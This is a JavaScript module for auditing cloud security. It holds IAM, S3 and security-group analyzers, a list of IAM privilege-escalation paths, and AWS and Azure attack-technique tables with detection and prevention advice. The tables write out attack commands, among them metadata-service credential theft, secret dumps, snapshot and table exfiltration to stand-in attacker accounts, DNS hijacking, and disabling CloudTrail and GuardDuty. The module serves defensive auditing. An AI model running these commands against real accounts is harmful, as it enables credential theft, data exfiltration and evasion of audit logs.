// Cloud Security Assessment Engine — AWS, Azure, GCP, Kubernetes, Terraform
// Real security analysis tools for cloud infrastructure auditing.
// All functions are pure browser-compatible ES modules.

// ═══════════════════════════════════════════════════════════════════
// AWS IAM POLICY ANALYZER
// ═══════════════════════════════════════════════════════════════════

export function parseIAMPolicy(json) {
  let policy;
  try { policy = typeof json === "string" ? JSON.parse(json) : json; } catch { return { error: "Invalid JSON" }; }
  if (!policy.Statement) return { error: "Missing Statement array" };
  const findings = [];
  const stmts = Array.isArray(policy.Statement) ? policy.Statement : [policy.Statement];
  for (let i = 0; i < stmts.length; i++) {
    const s = stmts[i];
    const effect = s.Effect || "Allow";
    const actions = Array.isArray(s.Action) ? s.Action : (s.Action ? [s.Action] : []);
    const resources = Array.isArray(s.Resource) ? s.Resource : (s.Resource ? [s.Resource] : []);
    const notActions = Array.isArray(s.NotAction) ? s.NotAction : (s.NotAction ? [s.NotAction] : []);
    if (effect === "Allow") {
      if (actions.includes("*") && resources.includes("*")) {
        findings.push({ severity: "critical", stmt: i, finding: "Full admin access: Action:* on Resource:*", recommendation: "Restrict to specific actions and resources following least-privilege principle" });
      }
      for (const a of actions) {
        if (a === "iam:*" || a === "iam:CreateUser" || a === "iam:CreateAccessKey" || a === "iam:AttachUserPolicy" || a === "iam:AttachRolePolicy" || a === "iam:PutUserPolicy" || a === "iam:PutRolePolicy") {
          findings.push({ severity: "high", stmt: i, finding: `IAM write permission: ${a}`, recommendation: "IAM modifications should be restricted to dedicated admin roles with MFA" });
        }
        if (a === "sts:AssumeRole" && resources.includes("*")) {
          findings.push({ severity: "high", stmt: i, finding: "Can assume any role (sts:AssumeRole on *)", recommendation: "Restrict AssumeRole to specific role ARNs" });
        }
        if (a === "s3:*" || a === "s3:GetObject" || a === "s3:PutObject") {
          if (resources.includes("*") || resources.some(r => r === "arn:aws:s3:::*")) {
            findings.push({ severity: "high", stmt: i, finding: `Broad S3 access: ${a} on all buckets`, recommendation: "Restrict S3 permissions to specific bucket ARNs" });
          }
        }
        if (a === "lambda:*" || a === "lambda:CreateFunction" || a === "lambda:UpdateFunctionCode") {
          findings.push({ severity: "medium", stmt: i, finding: `Lambda write access: ${a}`, recommendation: "Lambda code modification can lead to backdoor deployment" });
        }
        if (a === "ec2:RunInstances" && resources.includes("*")) {
          findings.push({ severity: "medium", stmt: i, finding: "Can launch EC2 instances in any subnet", recommendation: "Restrict RunInstances to specific VPCs/subnets and instance types" });
        }
        if (/kms:(Decrypt|Encrypt|GenerateDataKey|CreateGrant)/i.test(a)) {
          findings.push({ severity: "medium", stmt: i, finding: `KMS cryptographic operation: ${a}`, recommendation: "Restrict KMS operations to specific key ARNs" });
        }
        if (a === "logs:*" || a === "cloudtrail:StopLogging" || a === "cloudtrail:DeleteTrail") {
          findings.push({ severity: "critical", stmt: i, finding: `Audit log manipulation: ${a}`, recommendation: "Never allow deletion/stopping of audit logs outside dedicated security accounts" });
        }
        if (a === "organizations:*" || a === "account:*") {
          findings.push({ severity: "critical", stmt: i, finding: `Organization-level access: ${a}`, recommendation: "Organization management should be restricted to the management account only" });
        }
      }
      if (notActions.length > 0 && resources.includes("*")) {
        findings.push({ severity: "high", stmt: i, finding: "NotAction with Resource:* grants everything except listed actions", recommendation: "Avoid NotAction with wildcard resources — use explicit Allow lists instead" });
      }
      if (!s.Condition && actions.some(a => a.includes("*"))) {
        findings.push({ severity: "medium", stmt: i, finding: "Wildcard action without conditions", recommendation: "Add conditions (aws:SourceIp, aws:MultiFactorAuthPresent, etc.) to restrict access" });
      }
    }
  }
  return { policy, statements: stmts.length, findings, score: findings.length === 0 ? 100 : Math.max(0, 100 - findings.reduce((s, f) => s + (f.severity === "critical" ? 30 : f.severity === "high" ? 20 : 10), 0)) };
}

// ═══════════════════════════════════════════════════════════════════
// IAM PRIVILEGE ESCALATION PATHS
// ═══════════════════════════════════════════════════════════════════

export const IAM_PRIVESC_PATHS = [
  { name: "CreateNewPolicyVersion", actions: ["iam:CreatePolicyVersion"], desc: "Create a new version of an existing policy with admin permissions, then set it as default", severity: "critical", mitigation: "Restrict iam:CreatePolicyVersion and monitor for policy changes" },
  { name: "SetExistingDefaultPolicyVersion", actions: ["iam:SetDefaultPolicyVersion"], desc: "Set a previously created permissive policy version as the default", severity: "critical", mitigation: "Audit all policy versions, restrict SetDefaultPolicyVersion" },
  { name: "CreateAccessKey", actions: ["iam:CreateAccessKey"], desc: "Create access keys for a more privileged user", severity: "high", mitigation: "Restrict CreateAccessKey, monitor for new key creation" },
  { name: "CreateLoginProfile", actions: ["iam:CreateLoginProfile"], desc: "Create a console login for a more privileged user without one", severity: "high", mitigation: "Restrict CreateLoginProfile to self-service only" },
  { name: "UpdateLoginProfile", actions: ["iam:UpdateLoginProfile"], desc: "Change the password of a more privileged user", severity: "high", mitigation: "Restrict UpdateLoginProfile, require MFA for password changes" },
  { name: "AttachUserPolicy", actions: ["iam:AttachUserPolicy"], desc: "Attach AdministratorAccess to own user", severity: "critical", mitigation: "Use SCPs to prevent self-escalation, restrict AttachUserPolicy" },
  { name: "AttachGroupPolicy", actions: ["iam:AttachGroupPolicy"], desc: "Attach AdministratorAccess to a group the attacker belongs to", severity: "critical", mitigation: "Restrict AttachGroupPolicy, monitor policy attachments" },
  { name: "AttachRolePolicy", actions: ["iam:AttachRolePolicy"], desc: "Attach AdministratorAccess to a role the attacker can assume", severity: "critical", mitigation: "Restrict AttachRolePolicy, use permission boundaries" },
  { name: "PutUserPolicy", actions: ["iam:PutUserPolicy"], desc: "Add an inline admin policy to own user", severity: "critical", mitigation: "Restrict PutUserPolicy, prefer managed policies" },
  { name: "PutGroupPolicy", actions: ["iam:PutGroupPolicy"], desc: "Add an inline admin policy to a group", severity: "critical", mitigation: "Restrict PutGroupPolicy" },
  { name: "PutRolePolicy", actions: ["iam:PutRolePolicy"], desc: "Add an inline admin policy to a role", severity: "critical", mitigation: "Restrict PutRolePolicy, use permission boundaries" },
  { name: "AddUserToGroup", actions: ["iam:AddUserToGroup"], desc: "Add self to an admin group", severity: "high", mitigation: "Restrict AddUserToGroup, monitor group membership changes" },
  { name: "UpdateAssumeRolePolicy", actions: ["iam:UpdateAssumeRolePolicy"], desc: "Update a role's trust policy to allow attacker to assume it", severity: "high", mitigation: "Restrict UpdateAssumeRolePolicy, monitor trust policy changes" },
  { name: "PassRoleToLambda", actions: ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"], desc: "Create a Lambda with an admin role and invoke it", severity: "critical", mitigation: "Restrict PassRole to specific roles, monitor Lambda creation" },
  { name: "PassRoleToEC2", actions: ["iam:PassRole", "ec2:RunInstances"], desc: "Launch an EC2 instance with an admin instance profile", severity: "critical", mitigation: "Restrict PassRole, limit instance profile assignments" },
  { name: "PassRoleToCloudFormation", actions: ["iam:PassRole", "cloudformation:CreateStack"], desc: "Create a CloudFormation stack with an admin role", severity: "critical", mitigation: "Restrict CloudFormation role to specific service roles" },
  { name: "PassRoleToGlue", actions: ["iam:PassRole", "glue:CreateDevEndpoint"], desc: "Create a Glue dev endpoint with an admin role and SSH to it", severity: "high", mitigation: "Restrict Glue dev endpoint creation, monitor PassRole" },
  { name: "PassRoleToDataPipeline", actions: ["iam:PassRole", "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition", "datapipeline:ActivatePipeline"], desc: "Create a Data Pipeline with admin role to run arbitrary commands", severity: "high", mitigation: "Restrict Data Pipeline creation" },
  { name: "EditExistingLambdaCode", actions: ["lambda:UpdateFunctionCode"], desc: "Modify an existing Lambda function's code to exfiltrate its role credentials", severity: "high", mitigation: "Restrict UpdateFunctionCode, use code signing" },
  { name: "PassRoleToSageMaker", actions: ["iam:PassRole", "sagemaker:CreateNotebookInstance", "sagemaker:CreatePresignedNotebookInstanceUrl"], desc: "Create a SageMaker notebook with admin role", severity: "high", mitigation: "Restrict SageMaker notebook creation" },
  { name: "SSMStartSession", actions: ["ssm:StartSession"], desc: "Start an SSM session to an EC2 instance with an admin role", severity: "high", mitigation: "Restrict SSM sessions, use session logging" },
  { name: "CodeBuildProject", actions: ["iam:PassRole", "codebuild:CreateProject", "codebuild:StartBuild"], desc: "Create a CodeBuild project that exfiltrates role credentials", severity: "high", mitigation: "Restrict CodeBuild project creation" },
  { name: "CodeStarCreateProject", actions: ["codestar:CreateProject", "iam:PassRole"], desc: "Create a CodeStar project to gain additional permissions", severity: "medium", mitigation: "Restrict CodeStar access" },
  { name: "ECRGetAuthToken", actions: ["ecr:GetAuthorizationToken"], desc: "Get ECR auth token to push/pull container images with potential secrets", severity: "medium", mitigation: "Restrict ECR access, scan images for secrets" },
];

export function detectPrivescPaths(allowedActions) {
  const normalized = allowedActions.map(a => a.toLowerCase());
  const has = (action) => normalized.includes(action.toLowerCase()) || normalized.includes("*") || normalized.some(a => { const parts = action.toLowerCase().split(":"); return a === parts[0] + ":*"; });
  return IAM_PRIVESC_PATHS.filter(p => p.actions.every(a => has(a)));
}

// ═══════════════════════════════════════════════════════════════════
// S3 BUCKET POLICY ANALYZER
// ═══════════════════════════════════════════════════════════════════

export function analyzeS3BucketPolicy(policyJson) {
  let policy;
  try { policy = typeof policyJson === "string" ? JSON.parse(policyJson) : policyJson; } catch { return { error: "Invalid JSON" }; }
  const findings = [];
  const stmts = Array.isArray(policy.Statement) ? policy.Statement : [policy.Statement];
  for (let i = 0; i < stmts.length; i++) {
    const s = stmts[i];
    const principal = s.Principal;
    const effect = s.Effect || "Allow";
    const actions = Array.isArray(s.Action) ? s.Action : (s.Action ? [s.Action] : []);
    if (effect === "Allow") {
      if (principal === "*" || (principal && principal.AWS === "*")) {
        findings.push({ severity: "critical", stmt: i, finding: "Public access: Principal is *", recommendation: "Remove public access or restrict to specific AWS accounts/roles" });
        if (actions.some(a => a === "s3:*" || a === "s3:GetObject")) {
          findings.push({ severity: "critical", stmt: i, finding: "Public read access to bucket objects", recommendation: "Use CloudFront with OAI/OAC instead of direct public S3 access" });
        }
        if (actions.some(a => a === "s3:*" || a === "s3:PutObject")) {
          findings.push({ severity: "critical", stmt: i, finding: "Public write access — anyone can upload files", recommendation: "Remove public PutObject permission immediately" });
        }
        if (actions.some(a => a === "s3:*" || a === "s3:DeleteObject")) {
          findings.push({ severity: "critical", stmt: i, finding: "Public delete access — anyone can delete objects", recommendation: "Remove public DeleteObject permission, enable versioning and MFA delete" });
        }
      }
      if (!s.Condition) {
        if (actions.some(a => a === "s3:*")) {
          findings.push({ severity: "high", stmt: i, finding: "Full S3 access without conditions", recommendation: "Add conditions like aws:SourceIp, aws:SourceVpc, or aws:SecureTransport" });
        }
      }
      if (s.Condition) {
        const boolCond = s.Condition.Bool || {};
        if (boolCond["aws:SecureTransport"] === "false") {
          findings.push({ severity: "info", stmt: i, finding: "Requires HTTPS (good)", recommendation: null });
        }
      }
    }
    if (effect === "Deny" && s.Condition) {
      const boolCond = s.Condition.Bool || {};
      if (boolCond["aws:SecureTransport"] === "false") {
        findings.push({ severity: "info", stmt: i, finding: "Denies non-HTTPS access (good practice)", recommendation: null });
      }
    }
  }
  return { findings, publicAccess: findings.some(f => f.finding.includes("Public")), score: Math.max(0, 100 - findings.filter(f => f.severity !== "info").reduce((s, f) => s + (f.severity === "critical" ? 30 : f.severity === "high" ? 15 : 5), 0)) };
}

// ═══════════════════════════════════════════════════════════════════
// SECURITY GROUP ANALYZER
// ═══════════════════════════════════════════════════════════════════

export function analyzeSecurityGroup(rules) {
  const findings = [];
  for (const r of rules) {
    const dir = r.direction || "ingress";
    const proto = (r.protocol || "tcp").toLowerCase();
    const fromPort = r.fromPort || r.from_port || 0;
    const toPort = r.toPort || r.to_port || 65535;
    const cidr = r.cidr || r.cidrIp || r.cidr_blocks || "0.0.0.0/0";
    const cidrs = Array.isArray(cidr) ? cidr : [cidr];
    for (const c of cidrs) {
      if (dir === "ingress" && (c === "0.0.0.0/0" || c === "::/0")) {
        if (proto === "-1" || proto === "all") {
          findings.push({ severity: "critical", rule: r, finding: "All ports open to the internet", recommendation: "Restrict to specific ports and source IPs" });
        } else {
          const dangerousPorts = { 22: "SSH", 3389: "RDP", 3306: "MySQL", 5432: "PostgreSQL", 1433: "MSSQL", 27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 5601: "Kibana", 8080: "HTTP-alt", 8443: "HTTPS-alt", 445: "SMB", 135: "RPC", 139: "NetBIOS", 23: "Telnet", 21: "FTP", 11211: "Memcached", 2379: "etcd", 5900: "VNC", 4444: "Metasploit" };
          for (let p = fromPort; p <= toPort; p++) {
            if (dangerousPorts[p]) {
              findings.push({ severity: p === 22 || p === 3389 ? "high" : "critical", rule: r, finding: `${dangerousPorts[p]} (port ${p}) open to internet (${c})`, recommendation: `Restrict port ${p} to specific source IPs or use a VPN/bastion` });
            }
          }
          if (fromPort === 0 && toPort === 65535) {
            findings.push({ severity: "critical", rule: r, finding: `All ${proto.toUpperCase()} ports open to internet`, recommendation: "Restrict to specific ports needed" });
          }
        }
      }
    }
  }
  return { findings, openToInternet: findings.length > 0, score: Math.max(0, 100 - findings.reduce((s, f) => s + (f.severity === "critical" ? 25 : f.severity === "high" ? 15 : 5), 0)) };
}

// ═══════════════════════════════════════════════════════════════════
// AWS ATTACK TECHNIQUES DATABASE
// ═══════════════════════════════════════════════════════════════════

export const AWS_ATTACK_TECHNIQUES = [
  { id: "AWS-T001", name: "IMDS Credential Theft", tactic: "Credential Access", severity: "critical", desc: "Access EC2 Instance Metadata Service (IMDS) at 169.254.169.254 to steal IAM role credentials. IMDSv1 is unauthenticated; SSRF vulnerabilities in applications running on EC2 can reach it.", commands: ["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"], detection: ["CloudTrail: GetMetadataRequest events", "VPC Flow Logs: traffic to 169.254.169.254", "GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"], prevention: ["Enforce IMDSv2 (require token)", "Use VPC endpoints instead of public internet", "WAF rules to block SSRF payloads"] },
  { id: "AWS-T002", name: "IAM User Enumeration", tactic: "Reconnaissance", severity: "medium", desc: "Enumerate IAM users by attempting to update login profiles or get user details. Error messages reveal whether users exist.", commands: ["aws iam get-user --user-name target-user", "aws iam update-login-profile --user-name target-user --password Test123!"], detection: ["CloudTrail: GetUser, UpdateLoginProfile events from unusual sources", "CloudWatch alarm on IAM API throttling"], prevention: ["Use SCPs to restrict IAM enumeration from non-admin accounts", "Enable CloudTrail data events"] },
  { id: "AWS-T003", name: "S3 Bucket Enumeration", tactic: "Reconnaissance", severity: "medium", desc: "Discover S3 buckets by name guessing, DNS brute-forcing, or certificate transparency log analysis. Public buckets may expose sensitive data.", commands: ["aws s3 ls s3://company-backups --no-sign-request", "aws s3api get-bucket-acl --bucket target-bucket", "aws s3 cp s3://target-bucket/sensitive.txt ./"], detection: ["S3 access logs: requests from unknown IPs", "CloudTrail S3 data events", "GuardDuty: Discovery:S3/AnomalousBehavior"], prevention: ["Enable S3 Block Public Access at account level", "Use non-guessable bucket names", "Enable S3 access logging"] },
  { id: "AWS-T004", name: "Lambda Backdoor", tactic: "Persistence", severity: "critical", desc: "Modify existing Lambda function code to exfiltrate data or maintain access. Lambda functions often have powerful IAM roles. Attacker can add a hidden function that sends role credentials externally.", commands: ["aws lambda update-function-code --function-name target --zip-file fileb://backdoor.zip", "aws lambda add-permission --function-name target --statement-id backdoor --action lambda:InvokeFunction --principal '*'"], detection: ["CloudTrail: UpdateFunctionCode, UpdateFunctionConfiguration", "Lambda code signing validation failures", "Unusual Lambda invocation patterns"], prevention: ["Enable Lambda code signing", "Restrict UpdateFunctionCode permission", "Monitor Lambda deployments in CI/CD pipeline"] },
  { id: "AWS-T005", name: "CloudFormation Stack Injection", tactic: "Execution", severity: "critical", desc: "Create or update CloudFormation stacks with malicious resources. Stacks run with the service role's permissions, which are often overly broad.", commands: ["aws cloudformation create-stack --stack-name backdoor --template-body file://evil.yaml --role-arn arn:aws:iam::ACCOUNT:role/CFRole", "aws cloudformation update-stack --stack-name legit --template-body file://modified.yaml"], detection: ["CloudTrail: CreateStack, UpdateStack with unusual templates", "Config rules for resource compliance", "SCM monitoring for template changes"], prevention: ["Restrict CloudFormation service roles", "Use CloudFormation drift detection", "Require template review/approval processes"] },
  { id: "AWS-T006", name: "STS Cross-Account Assume Role", tactic: "Lateral Movement", severity: "high", desc: "Assume roles in other AWS accounts using overly permissive trust policies. Organizations with many accounts often have trust relationships that can be chained.", commands: ["aws sts assume-role --role-arn arn:aws:iam::TARGET:role/RoleName --role-session-name attacker", "aws sts get-caller-identity"], detection: ["CloudTrail: AssumeRole events across accounts", "GuardDuty: UnauthorizedAccess:IAMUser/CrossAccountAccess", "Monitor for unusual cross-account patterns"], prevention: ["Restrict trust policies to specific roles/users", "Use external ID for cross-account roles", "Implement SCP guardrails"] },
  { id: "AWS-T007", name: "EC2 User Data Script Injection", tactic: "Execution", severity: "high", desc: "Modify EC2 instance user data to inject commands that run at next boot. User data scripts run as root and can install backdoors, exfiltrate data, or modify system configuration.", commands: ["aws ec2 modify-instance-attribute --instance-id i-xxx --user-data Value=base64_encoded_script", "aws ec2 describe-instance-attribute --instance-id i-xxx --attribute userData"], detection: ["CloudTrail: ModifyInstanceAttribute for userData", "EC2 System Manager inventory changes", "File integrity monitoring on instances"], prevention: ["Restrict ModifyInstanceAttribute permission", "Use immutable infrastructure (terminate and replace, don't modify)", "Monitor user data changes"] },
  { id: "AWS-T008", name: "SSM Parameter Store Credential Theft", tactic: "Credential Access", severity: "high", desc: "Read secrets stored in SSM Parameter Store. Many applications store database passwords, API keys, and other secrets as SSM parameters.", commands: ["aws ssm get-parameters-by-path --path / --recursive --with-decryption", "aws ssm get-parameter --name /prod/db/password --with-decryption"], detection: ["CloudTrail: GetParameter, GetParametersByPath with --with-decryption", "CloudWatch alarm on bulk parameter reads", "Monitor for access from unusual IAM principals"], prevention: ["Use fine-grained IAM policies for SSM parameters", "Encrypt parameters with customer-managed KMS keys", "Use AWS Secrets Manager with rotation instead"] },
  { id: "AWS-T009", name: "Secrets Manager Exfiltration", tactic: "Credential Access", severity: "critical", desc: "Retrieve all secrets from AWS Secrets Manager. Contains database credentials, API keys, and other sensitive values.", commands: ["aws secretsmanager list-secrets", "aws secretsmanager get-secret-value --secret-id prod/db/master"], detection: ["CloudTrail: ListSecrets, GetSecretValue events", "GuardDuty: CredentialAccess:Kubernetes/MaliciousIPCaller", "CloudWatch alarm on secret access from new principals"], prevention: ["Restrict GetSecretValue to specific secrets and roles", "Enable secret rotation", "Use VPC endpoints for Secrets Manager access"] },
  { id: "AWS-T010", name: "S3 Bucket Takeover via Dangling DNS", tactic: "Initial Access", severity: "high", desc: "Take over an S3 bucket pointed to by a CNAME/alias record after the original bucket is deleted. The attacker creates a bucket with the same name in their account.", commands: ["# Find dangling DNS: dig +short CNAME target.example.com", "# If points to s3, check if bucket exists", "aws s3 ls s3://target-bucket-name 2>&1 | grep NoSuchBucket", "aws s3 mb s3://target-bucket-name"], detection: ["Certificate Transparency monitoring", "DNS record auditing", "Regular S3 bucket inventory reconciliation"], prevention: ["Remove DNS records when deleting S3 buckets", "Use Route53 alias records (fail closed)", "Audit CNAME records pointing to S3"] },
  { id: "AWS-T011", name: "EBS Snapshot Exfiltration", tactic: "Exfiltration", severity: "high", desc: "Copy EBS snapshots to attacker-controlled account. Snapshots may contain sensitive data, encryption keys, or credentials.", commands: ["aws ec2 describe-snapshots --owner-ids self", "aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --add '{\"Add\":[{\"UserId\":\"ATTACKER_ACCOUNT\"}]}'"], detection: ["CloudTrail: ModifySnapshotAttribute", "GuardDuty: Exfiltration:EC2/EBSSnapshotExfiltration", "Monitor shared snapshot permissions"], prevention: ["Enable EBS default encryption with customer-managed keys", "Use SCPs to prevent snapshot sharing", "Regular snapshot permission audits"] },
  { id: "AWS-T012", name: "RDS Snapshot Exfiltration", tactic: "Exfiltration", severity: "critical", desc: "Share RDS database snapshots with an attacker account, then restore the database to access all data.", commands: ["aws rds describe-db-snapshots --db-instance-identifier prod-db", "aws rds modify-db-snapshot-attribute --db-snapshot-identifier rds:prod-db-xxx --attribute-name restore --values-to-add ATTACKER_ACCOUNT"], detection: ["CloudTrail: ModifyDBSnapshotAttribute", "Config rule: rds-snapshots-public-prohibited", "Monitor snapshot sharing events"], prevention: ["Enable RDS encryption with customer-managed KMS keys (encrypted snapshots can't be shared)", "Use SCPs to prevent snapshot sharing", "Enable RDS event subscriptions"] },
  { id: "AWS-T013", name: "CloudTrail Disruption", tactic: "Defense Evasion", severity: "critical", desc: "Stop CloudTrail logging to operate without audit records. An attacker with sufficient permissions can disable trails, delete logs, or modify event selectors.", commands: ["aws cloudtrail stop-logging --name default", "aws cloudtrail delete-trail --name security-audit", "aws cloudtrail update-trail --name default --no-include-global-service-events"], detection: ["CloudWatch alarm on CloudTrail status changes", "GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled", "Organizations-level CloudTrail (cannot be disabled by member accounts)"], prevention: ["Use organization trail (member accounts can't modify)", "SCP deny cloudtrail:StopLogging, cloudtrail:DeleteTrail", "S3 Object Lock for log integrity"] },
  { id: "AWS-T014", name: "GuardDuty Evasion", tactic: "Defense Evasion", severity: "high", desc: "Disable GuardDuty detectors to avoid threat detection alerts.", commands: ["aws guardduty list-detectors", "aws guardduty delete-detector --detector-id xxx", "aws guardduty update-detector --detector-id xxx --no-enable"], detection: ["CloudTrail: DeleteDetector, UpdateDetector events", "CloudWatch alarm on GuardDuty status changes", "Organization-level GuardDuty management"], prevention: ["Use delegated administrator for GuardDuty", "SCP deny guardduty:DeleteDetector", "Monitor detector status with Config rules"] },
  { id: "AWS-T015", name: "VPC Flow Log Deletion", tactic: "Defense Evasion", severity: "high", desc: "Delete VPC flow logs to hide network activity. Flow logs capture network connection metadata that can reveal lateral movement and data exfiltration.", commands: ["aws ec2 describe-flow-logs", "aws ec2 delete-flow-logs --flow-log-ids fl-xxx"], detection: ["CloudTrail: DeleteFlowLogs events", "CloudWatch alarm on flow log changes", "Config rule for required flow logs"], prevention: ["SCP deny ec2:DeleteFlowLogs", "Use centralized logging account", "Organization-level flow log management"] },
  { id: "AWS-T016", name: "Cognito User Pool Takeover", tactic: "Credential Access", severity: "high", desc: "Exploit misconfigured Cognito user pools to create admin users or modify existing user attributes.", commands: ["aws cognito-idp sign-up --client-id xxx --username attacker --password P@ss123!", "aws cognito-idp admin-set-user-settings --user-pool-id xxx --username target"], detection: ["CloudTrail: Cognito API events", "Monitor for unusual user creation patterns", "Alert on admin API calls from non-admin sources"], prevention: ["Disable self-registration if not needed", "Use pre-signup Lambda trigger for validation", "Restrict admin API access"] },
  { id: "AWS-T017", name: "SQS/SNS Message Injection", tactic: "Impact", severity: "medium", desc: "Send malicious messages to SQS queues or SNS topics that are processed by downstream services. Can trigger arbitrary code execution in consumers.", commands: ["aws sqs send-message --queue-url https://sqs.region.amazonaws.com/ACCOUNT/queue --message-body '{\"cmd\":\"malicious\"}'", "aws sns publish --topic-arn arn:aws:sns:region:ACCOUNT:topic --message '{}'"], detection: ["CloudTrail: SendMessage, Publish events from unusual sources", "Monitor message volume anomalies", "Application-level input validation logging"], prevention: ["Restrict queue/topic access to specific IAM roles", "Implement message validation in consumers", "Use server-side encryption"] },
  { id: "AWS-T018", name: "DynamoDB Data Exfiltration", tactic: "Exfiltration", severity: "high", desc: "Scan or export entire DynamoDB tables containing sensitive data. Tables often contain user data, session tokens, or application state.", commands: ["aws dynamodb scan --table-name Users --output json > exfil.json", "aws dynamodb export-table-to-point-in-time --table-arn arn:aws:dynamodb:region:ACCOUNT:table/Users --s3-bucket attacker-bucket"], detection: ["CloudTrail: Scan, ExportTableToPointInTime events", "DynamoDB consumed capacity spikes", "GuardDuty DynamoDB anomaly detection"], prevention: ["Use fine-grained access control", "Enable DynamoDB encryption at rest with customer keys", "Implement item-level access control"] },
  { id: "AWS-T019", name: "Route53 DNS Hijacking", tactic: "Persistence", severity: "critical", desc: "Modify Route53 hosted zone records to redirect traffic to attacker-controlled servers. Can intercept credentials, deploy phishing, or perform MiTM attacks.", commands: ["aws route53 change-resource-record-sets --hosted-zone-id Z123 --change-batch '{\"Changes\":[{\"Action\":\"UPSERT\",\"ResourceRecordSet\":{\"Name\":\"login.target.com\",\"Type\":\"A\",\"TTL\":60,\"ResourceRecords\":[{\"Value\":\"ATTACKER_IP\"}]}}]}'"], detection: ["CloudTrail: ChangeResourceRecordSets events", "DNS monitoring for record changes", "Certificate Transparency for new certs on your domains"], prevention: ["Restrict Route53 permissions to DNS admin roles only", "Enable DNSSEC", "Use change auditing and approval workflows"] },
  { id: "AWS-T020", name: "ECR Image Poisoning", tactic: "Supply Chain", severity: "critical", desc: "Push malicious container images to ECR repositories used in production deployments. Images can contain backdoors, cryptominers, or data exfiltration tools.", commands: ["aws ecr get-login-password | docker login --username AWS --password-stdin ACCOUNT.dkr.ecr.region.amazonaws.com", "docker push ACCOUNT.dkr.ecr.region.amazonaws.com/app:latest"], detection: ["CloudTrail: PutImage events", "ECR image scanning results", "CI/CD pipeline image verification"], prevention: ["Enable ECR image scanning", "Use image signing and verification", "Restrict push access to CI/CD service roles only"] },
];

// ═══════════════════════════════════════════════════════════════════
// AZURE ATTACK TECHNIQUES DATABASE
// ═══════════════════════════════════════════════════════════════════

export const AZURE_ATTACK_TECHNIQUES = [
  { id: "AZ-T001", name: "Managed Identity Token Theft", tactic: "Credential Access", severity: "critical", desc: "Access the Azure Instance Metadata Service (IMDS) at 169.254.169.254 to steal managed identity tokens. Similar to AWS IMDS but uses a different endpoint path.", commands: ["curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"], detection: ["Azure Monitor: unusual IMDS access patterns", "Microsoft Defender for Cloud alerts", "Network logs showing metadata endpoint access"], prevention: ["Use user-assigned managed identities with minimal permissions", "Network-level restrictions on IMDS access", "Application-level proxy for metadata access"] },
  { id: "AZ-T002", name: "Storage Account Key Theft", tactic: "Credential Access", severity: "critical", desc: "Retrieve storage account access keys which provide full access to all data in the storage account (blobs, tables, queues, files).", commands: ["az storage account keys list --account-name targetaccount --resource-group rg", "az storage blob download-batch --account-name targetaccount --account-key KEY --source container --destination ./exfil/"], detection: ["Azure Activity Log: listKeys operation", "Microsoft Defender for Storage alerts", "Monitor for bulk blob downloads"], prevention: ["Use Azure AD authentication instead of access keys", "Disable shared key authentication", "Use SAS tokens with minimal permissions and expiry"] },
  { id: "AZ-T003", name: "Azure AD Password Spray", tactic: "Credential Access", severity: "high", desc: "Attempt common passwords against many Azure AD accounts. Azure AD has smart lockout but spray attacks below the threshold can succeed.", commands: ["# Using tools like MSOLSpray, Spray, or custom scripts", "# Target: https://login.microsoftonline.com/TENANT_ID/oauth2/token", "# Try one password per user per hour to avoid lockout"], detection: ["Azure AD Sign-in logs: multiple failed logins", "Microsoft Defender for Identity alerts", "Conditional Access: impossible travel detection"], prevention: ["Enable MFA for all users", "Use Azure AD Password Protection", "Implement Conditional Access policies", "Block legacy authentication protocols"] },
  { id: "AZ-T004", name: "Azure AD Application Consent Grant", tactic: "Persistence", severity: "critical", desc: "Register a malicious Azure AD application and trick an admin into granting it broad permissions (illicit consent grant attack).", commands: ["# Create app registration with broad Graph API permissions", "# Send phishing link: https://login.microsoftonline.com/TENANT/adminconsent?client_id=APP_ID"], detection: ["Azure AD Audit logs: consent grant events", "Monitor for new app registrations with broad permissions", "Alert on admin consent grants"], prevention: ["Configure admin consent workflow", "Restrict user consent to verified publishers", "Require admin approval for high-privilege permissions"] },
  { id: "AZ-T005", name: "Azure Runbook Abuse", tactic: "Execution", severity: "high", desc: "Create or modify Azure Automation runbooks to execute arbitrary code with the automation account's permissions.", commands: ["az automation runbook create --automation-account-name acc --resource-group rg --name backdoor --type PowerShell", "az automation runbook publish --automation-account-name acc --resource-group rg --name backdoor"], detection: ["Azure Activity Log: runbook creation/modification events", "Monitor runbook execution history", "Alert on new runbooks in production automation accounts"], prevention: ["Restrict Automation account management to specific admins", "Use source control integration for runbooks", "Implement approval workflows for runbook changes"] },
  { id: "AZ-T006", name: "Key Vault Secret Exfiltration", tactic: "Credential Access", severity: "critical", desc: "Access Azure Key Vault to retrieve stored secrets, keys, and certificates. Key Vaults often contain database connection strings, API keys, and encryption keys.", commands: ["az keyvault list", "az keyvault secret list --vault-name target-vault", "az keyvault secret show --vault-name target-vault --name db-password"], detection: ["Key Vault diagnostic logs: SecretGet events", "Microsoft Defender for Key Vault alerts", "Monitor for bulk secret access"], prevention: ["Use Key Vault access policies with minimal permissions", "Enable Key Vault firewall and VNET restrictions", "Use managed identities for Key Vault access", "Enable purge protection"] },
  { id: "AZ-T007", name: "Azure AD Role Escalation", tactic: "Privilege Escalation", severity: "critical", desc: "Escalate privileges by assigning Azure AD directory roles or Azure RBAC roles to the attacker's account.", commands: ["az role assignment create --assignee attacker@tenant.com --role Owner --scope /subscriptions/SUB_ID", "# Via Graph API: POST /directoryRoles/{role-id}/members"], detection: ["Azure AD Audit logs: role assignment events", "PIM activation alerts", "Monitor for Owner/Contributor assignments at subscription level"], prevention: ["Use Privileged Identity Management (PIM) for JIT access", "Require approval for high-privilege role activations", "Alert on all Owner/Contributor role assignments"] },
